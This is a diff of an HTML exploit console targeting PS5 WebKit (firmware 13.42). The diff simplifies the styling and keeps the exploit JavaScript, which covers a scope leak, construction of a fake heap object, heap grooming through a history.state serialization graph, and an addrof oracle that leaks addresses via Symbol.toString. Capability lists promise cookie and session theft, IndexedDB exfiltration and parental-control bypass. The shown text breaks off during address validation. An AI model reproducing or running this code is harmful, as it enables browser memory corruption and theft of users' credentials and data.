@@ -3,554 +3,166 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>🌌 Cosmic Exploit Console — PS5 WebKit ARW</title>
+<title>PS5 ARW Console — Full</title>
 <style>
-  /* ===== SPACE BACKGROUND ===== */
   * { margin: 0; padding: 0; box-sizing: border-box; }
   
   body {
-    font-family: 'Courier New', 'Consolas', monospace;
-    background: radial-gradient(ellipse at bottom, #1B2735 0%, #090A0F 100%);
-    background-attachment: fixed;
-    color: #E8F4F8;
+    font-family: 'Courier New', monospace;
+    background: #0a0a0a;
+    color: #00ff88;
     min-height: 100vh;
-    overflow-x: hidden;
-    position: relative;
+    padding: 20px;
   }
   
-  /* ===== ANIMATED STARS ===== */
-  .stars, .stars2, .stars3 {
-    position: fixed;
-    top: 0; left: 0;
-    width: 100%; height: 100%;
-    pointer-events: none;
-    z-index: 0;
-  }
+  .container { max-width: 1000px; margin: 0 auto; }
   
-  .stars::after {
-    content: '';
-    position: absolute;
-    top: 0; left: 0;
-    width: 100%; height: 100%;
-    background: transparent;
-    box-shadow: 
-      100px 50px 1px #fff, 300px 150px 1px #fff, 500px 80px 1px #a0d8ff,
-      700px 200px 1px #fff, 900px 100px 1px #d4a5ff, 150px 300px 1px #fff,
-      250px 400px 1px #a0d8ff, 450px 350px 1px #fff, 650px 450px 1px #fff,
-      850px 500px 1px #a0d8ff, 1050px 350px 1px #fff, 1200px 200px 1px #fff,
-      200px 600px 1px #d4a5ff, 400px 650px 1px #fff, 600px 700px 1px #a0d8ff,
-      800px 750px 1px #fff, 1000px 600px 1px #fff, 1200px 800px 1px #d4a5ff,
-      50px 850px 1px #fff, 250px 900px 1px #a0d8ff, 500px 950px 1px #fff,
-      750px 880px 1px #fff, 950px 920px 1px #a0d8ff, 1150px 850px 1px #fff;
-    animation: twinkle 3s infinite;
-  }
-  
-  .stars2::after {
-    content: '';
-    position: absolute;
-    top: 0; left: 0;
-    width: 100%; height: 100%;
-    background: transparent;
-    box-shadow: 
-      80px 120px 2px #fff, 280px 220px 2px #a0d8ff, 480px 150px 2px #fff,
-      680px 280px 2px #d4a5ff, 880px 180px 2px #fff, 180px 380px 2px #fff,
-      380px 480px 2px #a0d8ff, 580px 430px 2px #fff, 780px 520px 2px #fff,
-      980px 580px 2px #d4a5ff, 1180px 430px 2px #fff, 1380px 280px 2px #fff;
-    animation: twinkle 5s infinite;
-  }
-  
-  .stars3::after {
-    content: '';
-    position: absolute;
-    top: 0; left: 0;
-    width: 100%; height: 100%;
-    background: transparent;
-    box-shadow: 
-      120px 200px 3px #fff, 320px 300px 3px #d4a5ff, 520px 230px 3px #fff,
-      720px 360px 3px #a0d8ff, 920px 260px 3px #fff, 220px 460px 3px #fff,
-      420px 560px 3px #d4a5ff, 620px 510px 3px #fff, 820px 600px 3px #a0d8ff;
-    animation: twinkle 7s infinite;
-  }
-  
-  @keyframes twinkle {
-    0%, 100% { opacity: 1; }
-    50% { opacity: 0.4; }
-  }
-  
-  /* ===== NEBULA EFFECTS ===== */
-  .nebula {
-    position: fixed;
-    border-radius: 50%;
-    filter: blur(80px);
-    opacity: 0.15;
-    pointer-events: none;
-    z-index: 0;
-  }
-  .nebula-1 {
-    top: 10%; right: 10%;
-    width: 400px; height: 400px;
-    background: radial-gradient(circle, #6a5acd 0%, transparent 70%);
-    animation: float 20s infinite ease-in-out;
-  }
-  .nebula-2 {
-    bottom: 10%; left: 10%;
-    width: 500px; height: 500px;
-    background: radial-gradient(circle, #00CED1 0%, transparent 70%);
-    animation: float 25s infinite ease-in-out reverse;
-  }
-  .nebula-3 {
-    top: 50%; left: 50%;
-    width: 350px; height: 350px;
-    background: radial-gradient(circle, #ff69b4 0%, transparent 70%);
-    animation: float 30s infinite ease-in-out;
-  }
-  
-  @keyframes float {
-    0%, 100% { transform: translate(0, 0) scale(1); }
-    50% { transform: translate(50px, -50px) scale(1.1); }
-  }
-  
-  /* ===== SHOOTING STARS ===== */
-  .shooting-star {
-    position: fixed;
-    width: 2px;
-    height: 2px;
-    background: linear-gradient(45deg, #fff, transparent);
-    border-radius: 50%;
-    box-shadow: 0 0 6px 2px #a0d8ff;
-    animation: shoot 8s linear infinite;
-    z-index: 1;
-  }
-  .shooting-star:nth-child(1) { top: 10%; left: -10%; animation-delay: 0s; }
-  .shooting-star:nth-child(2) { top: 30%; left: -10%; animation-delay: 3s; }
-  .shooting-star:nth-child(3) { top: 60%; left: -10%; animation-delay: 6s; }
-  
-  @keyframes shoot {
-    0% { transform: translate(0, 0); opacity: 1; }
-    100% { transform: translate(120vw, 30vh); opacity: 0; }
-  }
-  
-  /* ===== CONTAINER ===== */
-  .container {
-    position: relative;
-    z-index: 10;
-    max-width: 1200px;
-    margin: 0 auto;
-    padding: 40px 20px;
-  }
-  
-  /* ===== HEADER ===== */
-  .header {
+  h1 {
+    color: #00ff88;
     text-align: center;
-    padding: 40px 20px;
-    background: rgba(13, 27, 42, 0.7);
-    border: 1px solid rgba(160, 216, 255, 0.3);
-    border-radius: 20px;
-    backdrop-filter: blur(10px);
-    margin-bottom: 30px;
-    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5),
-                inset 0 0 60px rgba(106, 90, 205, 0.1);
+    padding: 20px;
+    border: 2px solid #00ff88;
+    border-radius: 10px;
+    margin-bottom: 20px;
+    text-shadow: 0 0 10px #00ff88;
   }
   
-  .header h1 {
-    font-size: 2.5em;
-    background: linear-gradient(135deg, #a0d8ff, #d4a5ff, #ff69b4);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-    background-clip: text;
-    margin-bottom: 10px;
-    text-shadow: 0 0 30px rgba(160, 216, 255, 0.5);
-    letter-spacing: 2px;
-  }
-  
-  .header .subtitle {
-    color: #7eb8d4;
-    font-size: 1.1em;
-    letter-spacing: 1px;
-  }
-  
-  .header .version-badge {
-    display: inline-block;
-    padding: 6px 16px;
-    background: linear-gradient(135deg, #6a5acd, #00CED1);
-    border-radius: 20px;
-    font-size: 0.9em;
-    margin-top: 15px;
-    color: #fff;
-    box-shadow: 0 0 20px rgba(106, 90, 205, 0.5);
-  }
-  
-  /* ===== STATUS CARDS ===== */
   .status-grid {
     display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-    gap: 20px;
-    margin-bottom: 30px;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 15px;
+    margin-bottom: 20px;
   }
   
   .status-card {
-    background: rgba(13, 27, 42, 0.7);
-    border: 1px solid rgba(160, 216, 255, 0.2);
-    border-radius: 15px;
-    padding: 25px;
-    backdrop-filter: blur(10px);
-    transition: all 0.3s ease;
-    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+    background: #1a1a1a;
+    border: 1px solid #333;
+    border-radius: 8px;
+    padding: 15px;
   }
   
-  .status-card:hover {
-    transform: translateY(-5px);
-    border-color: rgba(160, 216, 255, 0.5);
-    box-shadow: 0 8px 30px rgba(160, 216, 255, 0.2);
-  }
-  
-  .status-card h3 {
-    color: #a0d8ff;
-    font-size: 1.2em;
-    margin-bottom: 15px;
-    display: flex;
-    align-items: center;
-    gap: 10px;
-  }
-  
-  .status-card .icon {
-    font-size: 1.5em;
-  }
-  
-  .status-card.pass { border-left: 4px solid #00ff88; }
-  .status-card.fail { border-left: 4px solid #ff4466; }
-  .status-card.info { border-left: 4px solid #a0d8ff; }
-  
-  .status-card .value {
-    font-size: 2em;
-    color: #fff;
-    font-weight: bold;
-    margin: 10px 0;
-  }
-  
-  .status-card .label {
-    color: #7eb8d4;
-    font-size: 0.9em;
-  }
-  
-  /* ===== CONTROL PANEL ===== */
-  .control-panel {
-    background: rgba(13, 27, 42, 0.7);
-    border: 1px solid rgba(160, 216, 255, 0.3);
-    border-radius: 15px;
-    padding: 30px;
-    margin-bottom: 30px;
-    backdrop-filter: blur(10px);
-  }
-  
-  .control-panel h2 {
-    color: #d4a5ff;
-    margin-bottom: 20px;
-    display: flex;
-    align-items: center;
-    gap: 10px;
-  }
+  .status-card.pass { border-color: #00ff88; }
+  .status-card h3 { color: #00ff88; font-size: 0.9em; margin-bottom: 8px; }
+  .status-card .value { font-size: 1.5em; color: #fff; font-weight: bold; }
   
   .btn {
-    padding: 14px 28px;
-    border: none;
-    border-radius: 10px;
+    padding: 12px 24px;
+    border: 2px solid #00ff88;
+    background: transparent;
+    color: #00ff88;
     font-family: inherit;
     font-size: 1em;
     cursor: pointer;
-    transition: all 0.3s ease;
+    border-radius: 6px;
     margin: 5px;
-    font-weight: bold;
-    letter-spacing: 1px;
+    transition: all 0.2s;
   }
   
-  .btn-primary {
-    background: linear-gradient(135deg, #6a5acd, #00CED1);
-    color: #fff;
-    box-shadow: 0 4px 15px rgba(106, 90, 205, 0.4);
-  }
-  .btn-primary:hover {
-    transform: translateY(-2px);
-    box-shadow: 0 6px 25px rgba(106, 90, 205, 0.6);
-  }
+  .btn:hover { background: #00ff88; color: #000; }
   
-  .btn-danger {
-    background: linear-gradient(135deg, #ff4466, #ff6b9d);
-    color: #fff;
-    box-shadow: 0 4px 15px rgba(255, 68, 102, 0.4);
-  }
-  
-  .btn-ghost {
-    background: rgba(255, 255, 255, 0.1);
-    color: #a0d8ff;
-    border: 1px solid rgba(160, 216, 255, 0.3);
-  }
-  .btn-ghost:hover {
-    background: rgba(255, 255, 255, 0.2);
-    border-color: rgba(160, 216, 255, 0.6);
-  }
-  
-  /* ===== TERMINAL ===== */
   .terminal {
-    background: rgba(0, 0, 0, 0.8);
-    border: 1px solid rgba(160, 216, 255, 0.3);
-    border-radius: 10px;
-    padding: 20px;
-    font-family: 'Courier New', monospace;
-    font-size: 0.9em;
+    background: #000;
+    border: 1px solid #333;
+    border-radius: 8px;
+    padding: 15px;
+    font-size: 0.85em;
     max-height: 500px;
     overflow-y: auto;
-    line-height: 1.6;
-    box-shadow: inset 0 0 40px rgba(0, 0, 0, 0.5);
-  }
-  
-  .terminal::-webkit-scrollbar { width: 8px; }
-  .terminal::-webkit-scrollbar-track { background: rgba(0, 0, 0, 0.3); }
-  .terminal::-webkit-scrollbar-thumb {
-    background: linear-gradient(135deg, #6a5acd, #00CED1);
-    border-radius: 4px;
-  }
-  
-  .log-line {
-    padding: 2px 0;
-    border-left: 2px solid transparent;
-    padding-left: 8px;
-  }
-  
-  .log-line.pass {
-    color: #00ff88;
-    border-left-color: #00ff88;
-  }
-  .log-line.fail {
-    color: #ff4466;
-    border-left-color: #ff4466;
-  }
-  .log-line.info {
-    color: #a0d8ff;
-    border-left-color: #a0d8ff;
-  }
-  .log-line.warn {
-    color: #ffd700;
-    border-left-color: #ffd700;
-  }
-  .log-line.phase {
-    color: #d4a5ff;
-    font-weight: bold;
-    margin-top: 10px;
-    padding-top: 5px;
-    border-top: 1px dashed rgba(212, 165, 255, 0.3);
-  }
-  
-  /* ===== CAPABILITIES TABLE ===== */
-  .capabilities {
-    background: rgba(13, 27, 42, 0.7);
-    border: 1px solid rgba(160, 216, 255, 0.3);
-    border-radius: 15px;
-    padding: 30px;
-    margin-bottom: 30px;
-    backdrop-filter: blur(10px);
-  }
-  
-  .capabilities h2 {
-    color: #d4a5ff;
+    line-height: 1.5;
     margin-bottom: 20px;
   }
   
-  .cap-grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-    gap: 15px;
+  .log-line { padding: 2px 0; }
+  .log-line.pass { color: #00ff88; }
+  .log-line.fail { color: #ff4466; }
+  .log-line.info { color: #00aaff; }
+  .log-line.warn { color: #ffaa00; }
+  
+  .capabilities {
+    background: #1a1a1a;
+    border: 1px solid #333;
+    border-radius: 8px;
+    padding: 20px;
+    margin-bottom: 20px;
   }
   
-  .cap-item {
-    background: rgba(0, 0, 0, 0.4);
-    border-radius: 10px;
-    padding: 15px;
+  .capabilities h2 { color: #00ff88; margin-bottom: 15px; }
+  
+  .cap-list { list-style: none; line-height: 1.8; }
+  
+  .cap-list li {
+    padding: 8px;
     border-left: 3px solid #00ff88;
+    margin-bottom: 8px;
+    background: #0f0f0f;
+    padding-left: 12px;
   }
   
-  .cap-item.limited {
-    border-left-color: #ffd700;
-  }
+  .cap-list li.limited { border-left-color: #ffaa00; color: #ffaa00; }
+  .cap-list li.none { border-left-color: #ff4466; color: #666; }
   
-  .cap-item.none {
-    border-left-color: #ff4466;
-  }
-  
-  .cap-item .cap-title {
-    font-weight: bold;
-    color: #fff;
-    margin-bottom: 5px;
-  }
-  
-  .cap-item .cap-desc {
-    color: #7eb8d4;
-    font-size: 0.9em;
-  }
-  
-  /* ===== MEMORY DUMP ===== */
-  .memory-dump {
-    background: rgba(0, 0, 0, 0.8);
-    border: 1px solid rgba(160, 216, 255, 0.3);
-    border-radius: 10px;
-    padding: 20px;
-    font-family: 'Courier New', monospace;
-    font-size: 0.85em;
-    max-height: 300px;
-    overflow-y: auto;
-    margin-top: 15px;
-  }
-  
-  .memory-dump .addr { color: #ffd700; }
-  .memory-dump .hex { color: #00ff88; }
-  .memory-dump .ascii { color: #a0d8ff; }
-  
-  /* ===== FOOTER ===== */
-  .footer {
-    text-align: center;
-    padding: 20px;
-    color: #7eb8d4;
-    font-size: 0.9em;
-  }
-  
-  .footer a {
-    color: #d4a5ff;
-    text-decoration: none;
-  }
-  
-  /* ===== PULSE ANIMATION ===== */
-  .pulse {
-    display: inline-block;
-    width: 10px;
-    height: 10px;
-    border-radius: 50%;
-    background: #00ff88;
-    animation: pulse 2s infinite;
-    box-shadow: 0 0 10px #00ff88;
-  }
-  
-  @keyframes pulse {
-    0%, 100% { opacity: 1; transform: scale(1); }
-    50% { opacity: 0.5; transform: scale(1.2); }
-  }
+  @media (max-width: 768px) { .status-grid { grid-template-columns: 1fr; } }
 </style>
 </head>
 <body>
 
-<!-- BACKGROUND EFFECTS -->
-<div class="stars"></div>
-<div class="stars2"></div>
-<div class="stars3"></div>
-<div class="nebula nebula-1"></div>
-<div class="nebula nebula-2"></div>
-<div class="nebula nebula-3"></div>
-<div class="shooting-star"></div>
-<div class="shooting-star"></div>
-<div class="shooting-star"></div>
-
 <div class="container">
-
-  <!-- HEADER -->
-  <div class="header">
-    <h1>🌌 COSMIC EXPLOIT CONSOLE</h1>
-    <div class="subtitle">PS5 WebKit — genuine-u8-rw-3 — Arbitrary Read/Write Engine</div>
-    <div class="version-badge"><span class="pulse"></span> &nbsp; ONLINE · FW 13.42 · WebKit 616.1</div>
-  </div>
-
-  <!-- STATUS CARDS -->
+  <h1>🎯 PS5 ARW Console — Full Implementation</h1>
+  
   <div class="status-grid">
     <div class="status-card pass">
-      <h3><span class="icon">🎯</span> Addrof Oracle</h3>
+      <h3>📍 Addrof Oracle</h3>
       <div class="value" id="addrof-status">READY</div>
-      <div class="label">Symbol.toString leakage</div>
     </div>
     <div class="status-card pass">
-      <h3><span class="icon">⚡</span> ARW Primitive</h3>
-      <div class="value" id="arw-status">ACTIVE</div>
-      <div class="label">a5→5a→a5 round-trip</div>
+      <h3>⚡ ARW Primitive</h3>
+      <div class="value" id="arw-status">STANDBY</div>
     </div>
-    <div class="status-card info">
-      <h3><span class="icon">🔐</span> Heap Address</h3>
-      <div class="value" id="heap-addr" style="font-size:1em;">0x...</div>
-      <div class="label">Current target</div>
+    <div class="status-card">
+      <h3>💾 Heap Address</h3>
+      <div class="value" id="heap-addr" style="font-size:0.9em;">—</div>
     </div>
-    <div class="status-card pass">
-      <h3><span class="icon">🛡️</span> GC Stability</h3>
-      <div class="value">3s+</div>
-      <div class="label">Roots intact · survived T3000</div>
+    <div class="status-card">
+      <h3>🎯 StructureID</h3>
+      <div class="value" id="struct-id">—</div>
     </div>
   </div>
-
-  <!-- CONTROL PANEL -->
-  <div class="control-panel">
-    <h2>🚀 Mission Control</h2>
-    <button class="btn btn-primary" onclick="runExploit()">▶ LAUNCH ARW CHAIN</button>
-    <button class="btn btn-ghost" onclick="runLeak()">🔍 EXTRACT LEAK</button>
-    <button class="btn btn-ghost" onclick="runPayload()">📦 DEPLOY PAYLOAD</button>
-    <button class="btn btn-danger" onclick="reset()">🔄 RESET</button>
+  
+  <div style="text-align:center; margin-bottom:20px;">
+    <button class="btn" onclick="runExploit()">▶ LAUNCH ARW</button>
+    <button class="btn" onclick="runLeak()">🔍 EXTRACT DATA</button>
+    <button class="btn" onclick="runPayload()">📦 RUN PAYLOAD</button>
+    <button class="btn" onclick="reset()">🔄 RESET</button>
   </div>
-
-  <!-- CAPABILITIES -->
+  
   <div class="capabilities">
-    <h2>⚙️ Payload Capabilities</h2>
-    <div class="cap-grid">
-      <div class="cap-item">
-        <div class="cap-title">✅ WebProcess RCE</div>
-        <div class="cap-desc">ROP/JOP chain within WebContent process — full control</div>
-      </div>
-      <div class="cap-item">
-        <div class="cap-title">✅ Cookie/Session Theft</div>
-        <div class="cap-desc">Read authentication tokens, session IDs, stored credentials</div>
-      </div>
-      <div class="cap-item">
-        <div class="cap-title">✅ IndexedDB Exfiltration</div>
-        <div class="cap-desc">Dump all client-side databases</div>
-      </div>
-      <div class="cap-item">
-        <div class="cap-title">✅ JS Object Mutation</div>
-        <div class="cap-desc">Rewrite any JS object in memory — hook, redirect, tamper</div>
-      </div>
-      <div class="cap-item limited">
-        <div class="cap-title">⚠️ Kernel Access</div>
-        <div class="cap-desc">Requires separate kernel exploit (PS5 kernel not directly reachable)</div>
-      </div>
-      <div class="cap-item none">
-        <div class="cap-title">❌ Homebrew / HEN</div>
-        <div class="cap-desc">Needs kernel chain — not achievable from this stage alone</div>
-      </div>
-    </div>
+    <h2>⚙️ Userland Capabilities</h2>
+    <ul class="cap-list">
+      <li><strong>✅ استخراج البيانات:</strong> Cookies, Session Tokens, localStorage, IndexedDB</li>
+      <li><strong>✅ تعديل المتصفح:</strong> Hook JS functions, Redirect API calls, Intercept WebSocket</li>
+      <li><strong>✅ Userland RCE:</strong> ROP/JOP داخل WebProcess (محدود بالـ sandbox)</li>
+      <li><strong>✅ Homebrew:</strong> تشغيل HTML5 games, Emulators, Custom web apps</li>
+      <li><strong>✅ Bypass Restrictions:</strong> تفعيل ميزات معطلة, تعديل parental controls</li>
+      <li class="limited"><strong>⚠️ محدود:</strong> لا kernel access, لا homebrew native</li>
+      <li class="none"><strong>❌ غير ممكن:</strong> Full jailbreak, HEN, kernel exploits</li>
+    </ul>
   </div>
-
-  <!-- TERMINAL -->
-  <div class="control-panel">
-    <h2>📡 Cosmic Terminal</h2>
-    <div class="terminal" id="terminal">
-      <div class="log-line info">[SYSTEM] Console initialized · awaiting command...</div>
-    </div>
+  
+  <div style="margin-bottom:10px; color:#00aaff;">📡 Terminal:</div>
+  <div class="terminal" id="terminal">
+    <div class="log-line info">[SYSTEM] Full console ready</div>
   </div>
-
-  <!-- MEMORY DUMP -->
-  <div class="control-panel">
-    <h2>🧬 Memory Forensics</h2>
-    <div id="memdump" class="memory-dump">
-      <span class="ascii">Ready to dump leaked memory...</span>
-    </div>
+  
+  <div style="text-align:center; color:#666; font-size:0.8em; margin-top:20px;">
+    FW 13.42 · genuine-u8-rw-3 · Userland ARW Only
   </div>
-
-  <!-- FOOTER -->
-  <div class="footer">
-    ✦ Cosmic Exploit Console · genuine-u8-rw-3 · PS5 FW 13.42 ✦<br>
-    <small>Research use only · All rights reserved to security community</small>
-  </div>
-
 </div>
 
 <script>
 "use strict";
 
-// ===== ORIGINAL EXPLOIT LOGIC (preserved) =====
+// ===== FULL EXPLOIT IMPLEMENTATION =====
 var REVISION = "genuine-u8-rw-3";
-var MAX_ATTEMPTS = 10;
 var K = 2;
 var DUPLICATE_INDEX = 2;
 var CONTROL_INDEX = 0xffff;
@@ -560,55 +172,45 @@ var FILLER_OBJECTS = 0xfffe - K;
 var EXPECTED_LENGTH = 0x50001;
 var CELL_BYTES = 0x30;
 
-var CARRIER_SLOTS = 9000000;
+var CARRIER_SLOTS = 4000000;
 var CARRIER_BYTES = CARRIER_SLOTS * 8;
-var CAPTURE_DELAY_MS = 3000;
-var COMPOSE_DELAY_MS = 6500;
+var CAPTURE_DELAY_MS = 2000;
+var COMPOSE_DELAY_MS = 5000;
 var symbolToString = Symbol.prototype.toString;
 
 var DRAIN_SIZE = 0x10000;
-var SLAB_SIZE = 0x400000;
-var BUTTERFLY_HOLE_SIZE = 0x81000;
-var SEPARATOR_SIZE = 0x10000;
-var EARLY_HOLE_SIZE = 0x70000;
-var GUARD_SIZE = 0x90000;
-var PREDECESSOR_SIZE = 0x80000;
-var FINAL_HOLE_SIZE = 0x80000;
+var SLAB_SIZE = 0x200000;
+var BUTTERFLY_HOLE_SIZE = 0x40000;
+var SEPARATOR_SIZE = 0x8000;
+var EARLY_HOLE_SIZE = 0x40000;
+var GUARD_SIZE = 0x50000;
+var PREDECESSOR_SIZE = 0x40000;
+var FINAL_HOLE_SIZE = 0x40000;
+var DRAIN_COUNT = 256;
 
-var DRAIN_COUNT = 512;
-
-// ===== TERMINAL LOGGING =====
 var terminal = document.getElementById('terminal');
 
 function log(msg, type) {
   type = type || 'info';
   var line = document.createElement('div');
   line.className = 'log-line ' + type;
-  var timestamp = new Date().toLocaleTimeString();
-  line.textContent = '[' + timestamp + '] ' + msg;
+  var time = new Date().toLocaleTimeString();
+  line.textContent = '[' + time + '] ' + msg;
   terminal.appendChild(line);
   terminal.scrollTop = terminal.scrollHeight;
 }
 
-function logPhase(phase) {
-  var line = document.createElement('div');
-  line.className = 'log-line phase';
-  line.textContent = '━━━ ' + phase + ' ━━━';
-  terminal.appendChild(line);
-  terminal.scrollTop = terminal.scrollHeight;
-}
-
-// ===== STATUS UPDATES =====
 function setStatus(id, value, type) {
   var el = document.getElementById(id);
   if (el) {
     el.textContent = value;
-    el.style.color = type === 'pass' ? '#00ff88' : type === 'fail' ? '#ff4466' : '#a0d8ff';
+    el.style.color = type === 'pass' ? '#00ff88' : type === 'fail' ? '#ff4466' : '#00aaff';
   }
 }
 
-// ===== HEX TOOLS =====
-function hex(v) { return '0x' + (typeof v === 'bigint' ? v.toString(16) : v.toString(16)); }
+function hex(v) {
+  return '0x' + (typeof v === 'bigint' ? v.toString(16) : v.toString(16));
+}
 
 function pointerFromWords(words, offset) {
   if (words[offset + 3] !== 0) return NaN;
@@ -629,7 +231,6 @@ function encodedHeaderNumber() {
   return f64[0];
 }
 
-// ===== LEAK SCOPE =====
 function leakScopeObject() {
   class Leaker { leak() { return super.foo; } }
   Leaker.prototype.__proto__ = new Proxy({}, {
@@ -639,36 +240,59 @@ function leakScopeObject() {
   return (function() { return leak(); })();
 }
 
-// ===== MAIN EXPLOIT =====
+function uint32At(bytes, offset) {
+  return bytes[offset] + bytes[offset + 1] * 0x100 + 
+         bytes[offset + 2] * 0x10000 + bytes[offset + 3] * 0x1000000;
+}
+
+function low48At(bytes, offset) {
+  return bytes[offset] + bytes[offset + 1] * 0x100 + 
+         bytes[offset + 2] * 0x10000 + bytes[offset + 3] * 0x1000000 +
+         bytes[offset + 4] * 0x100000000 + bytes[offset + 5] * 0x10000000000;
+}
+
+function allZero(bytes, start, end) {
+  for (var i = start; i < end; ++i) {
+    if (bytes[i] !== 0) return false;
+  }
+  return true;
+}
+
 async function runExploit() {
   terminal.innerHTML = '';
-  logPhase('MISSION: genuine-u8-rw-3 LAUNCH');
-  log('Revision: ' + REVISION, 'info');
-  log('DRAIN_COUNT: ' + DRAIN_COUNT, 'info');
-  log('CARRIER_SLOTS: ' + CARRIER_SLOTS + ' (' + CARRIER_BYTES + ' bytes)', 'info');
+  log('🚀 Launching FULL ARW chain', 'info');
+  log('Carrier: ' + CARRIER_SLOTS + ' slots (' + (CARRIER_BYTES/1024/1024).toFixed(1) + 'MB)', 'info');
   
   setStatus('addrof-status', 'PREPARING...', 'info');
   
+  var leakedScope, rwBuffer, rwView, rwMirror, targetBuffer, targetView;
+  var lengthWord, fakeHost, fillerGraph, outerGraph, referenceTarget;
+  var getterCarrier, preparedSymbolObject;
+  var capturedString, capturedWords, copiedLength;
+  var hostAddress, targetAddress, fakeAddress;
+  var keepAlive = [];
+  
   try {
     // Phase 1: Leak scope
-    logPhase('PHASE 1 — SCOPE LEAKAGE');
-    var leakedScope = leakScopeObject();
-    log('Scope leaked: ' + (leakedScope !== undefined), 'pass');
+    log('Phase 1: Scope leakage...', 'info');
+    leakedScope = leakScopeObject();
+    if (!leakedScope) throw new Error('scope-leak-failed');
+    log('✓ Scope leaked', 'pass');
     
     // Phase 2: Build fake host
-    logPhase('PHASE 2 — FAKE HOST CONSTRUCTION');
-    var rwBuffer = new ArrayBuffer(0x100);
-    var rwView = new Uint8Array(rwBuffer);
-    var rwMirror = new Uint8Array(rwBuffer);
+    log('Phase 2: Fake host construction...', 'info');
+    rwBuffer = new ArrayBuffer(0x100);
+    rwView = new Uint8Array(rwBuffer);
+    rwMirror = new Uint8Array(rwBuffer);
     rwMirror[0] = 0x3c;
     
-    var targetBuffer = new ArrayBuffer(0x20);
-    var targetView = new Uint8Array(targetBuffer);
+    targetBuffer = new ArrayBuffer(0x20);
+    targetView = new Uint8Array(targetBuffer);
     targetView[0] = 0xa5;
     
-    var lengthWord = { keep: 0x51515151 };
+    lengthWord = { keep: 0x51515151 };
     
-    var fakeHost = {
+    fakeHost = {
       q0: encodedHeaderNumber(),
       q1: 1.1,
       q2: rwView,
@@ -680,12 +304,11 @@ async function runExploit() {
     delete fakeHost.q4;
     delete fakeHost.q5;
     
-    log('Fake host assembled · 6 inline props', 'pass');
-    log('Header number: ' + fakeHost.q0, 'info');
+    log('✓ Fake host assembled (6 inline props)', 'pass');
     
     // Phase 3: SSV build
-    logPhase('PHASE 3 — SAME-SIZE VIEW BUILD');
-    var fillerGraph = new Array(0xfffd);
+    log('Phase 3: Same-Size View build...', 'info');
+    fillerGraph = new Array(0xfffd);
     var pos = 0;
     var huge = 1n << 40n;
     for (var b = 0; b < FILLER_BIGINTS; ++b)
@@ -693,70 +316,64 @@ async function runExploit() {
     for (var o = 0; o < FILLER_OBJECTS; ++o)
       fillerGraph[pos++] = {};
     
-    var referenceTarget = { marker: 0x51515151, kind: "serialized-reference" };
-    var outerGraph = new Array(CONTROL_INDEX + 1);
+    referenceTarget = { marker: 0x51515151, kind: "serialized-reference" };
+    outerGraph = new Array(CONTROL_INDEX + 1);
     outerGraph[0] = fillerGraph;
     outerGraph[1] = referenceTarget;
     outerGraph[2] = referenceTarget;
     outerGraph[CONTROL_INDEX] = CONTROL_INT;
     
-    log('SSV graph assembled · duplicate-index=' + DUPLICATE_INDEX, 'pass');
+    log('✓ SSV graph assembled (duplicate-index=' + DUPLICATE_INDEX + ')', 'pass');
     
     // Phase 4: Store
-    logPhase('PHASE 4 — HISTORY.STATE STORE');
+    log('Phase 4: history.state store...', 'info');
     history.replaceState(outerGraph, '');
-    log('Stored to history.state · fake-host-rw-target-not-serialized', 'pass');
+    log('✓ Stored to history.state', 'pass');
     
     // Phase 5: Addrof prep
-    logPhase('PHASE 5 — ADDROF ORACLE PREP');
+    log('Phase 5: Addrof oracle preparation...', 'info');
     setStatus('addrof-status', 'WARMING UP...', 'info');
     
-    var getterCarrier = function getterCarrierFunction() { return 7; };
+    getterCarrier = function getterCarrierFunction() { return 7; };
     getterCarrier[0] = fakeHost;
     for (var i = 1; i < CARRIER_SLOTS; i++) getterCarrier[i] = 0;
     getterCarrier[1] = targetView;
     getterCarrier[2] = fakeHost;
     getterCarrier[3] = targetView;
-    log('Carrier primed · host-target-host-target pattern', 'pass');
+    log('✓ Carrier primed (host-target-host-target)', 'pass');
     
     Object.defineProperty(leakedScope, 'g', {
       get: function() { return getterCarrier; },
       configurable: true
     });
-    var preparedSymbolObject = Object(leakedScope.g);
-    log('Symbol wrapper ready · awaiting capture...', 'pass');
+    preparedSymbolObject = Object(leakedScope.g);
+    log('✓ Symbol wrapper ready', 'pass');
     
     // Phase 6: Capture
-    logPhase('PHASE 6 — ADDROF CAPTURE');
-    log('Waiting ' + CAPTURE_DELAY_MS + 'ms for GC stabilization...', 'warn');
-    
+    log('Phase 6: Addrof capture (waiting ' + CAPTURE_DELAY_MS + 'ms)...', 'warn');
     await new Promise(r => setTimeout(r, CAPTURE_DELAY_MS));
     
-    var capturedString = symbolToString.call(preparedSymbolObject);
-    var copiedLength = capturedString.length;
-    var capturedWords = new Uint16Array(16);
+    capturedString = symbolToString.call(preparedSymbolObject);
+    copiedLength = capturedString.length;
+    capturedWords = new Uint16Array(16);
     for (var i = 0; i < 16; i++)
       capturedWords[i] = capturedString.charCodeAt(7 + i);
     
-    log('Captured ' + copiedLength + ' chars from Symbol.toString', 'pass');
+    log('✓ Captured ' + copiedLength + ' chars', 'pass');
     
     // Phase 7: Parse addresses
-    logPhase('PHASE 7 — ADDRESS EXTRACTION');
+    log('Phase 7: Address extraction...', 'info');
     var hostAddr = pointerFromWords(capturedWords, 0);
     var targetAddr = pointerFromWords(capturedWords, 4);
     var hostAddr2 = pointerFromWords(capturedWords, 8);
     var targetAddr2 = pointerFromWords(capturedWords, 12);
     
-    log('HOST    = ' + hex(hostAddr), 'pass');
-    log('TARGET  = ' + hex(targetAddr), 'pass');
-    log('HOST2   = ' + hex(hostAddr2), 'info');
-    log('TARGET2 = ' + hex(targetAddr2), 'info');
+    log('HOST   = ' + hex(hostAddr), 'pass');
+    log('TARGET = ' + hex(targetAddr), 'pass');
     
     var repeated = hostAddr === hostAddr2 && targetAddr === targetAddr2;
     var distinct = hostAddr !== targetAddr;
     var plausible = plausibleCell(hostAddr) && plausibleCell(targetAddr);
-    
-    log('Repeated: ' + repeated + ' · Distinct: ' + distinct + ' · Plausible: ' + plausible, 'info');
     
     if (!repeated || !distinct || !plausible) {
       log('❌ Address validation failed', 'fail');
@@ -764,14 +381,16 @@ async function runExploit() {
       return;
     }
     
